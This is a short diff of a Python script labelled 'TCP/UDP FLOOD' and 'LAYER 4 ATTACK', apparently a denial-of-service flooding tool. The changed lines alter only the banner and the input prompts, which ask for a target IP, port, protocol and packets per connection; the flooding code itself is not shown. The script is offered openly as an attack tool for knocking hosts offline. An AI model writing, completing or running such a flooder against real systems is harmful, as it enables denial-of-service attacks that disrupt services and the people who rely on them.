@@ -4,9 +4,9 @@ import random
 import socket
 import threading
 
-print("--> C0de By Lee0n123 <--")
+print("--> LAYER 4 ATTACK <--")
 print("#-- TCP/UDP FLOOD --#")
-ip = str(input(" Host/Ip:"))
+ip = str(input(" IP :"))
 port = int(input(" Port:"))
 choice = str(input(" UDP(y/n):"))
 times = int(input(" Packets per one connection:"))
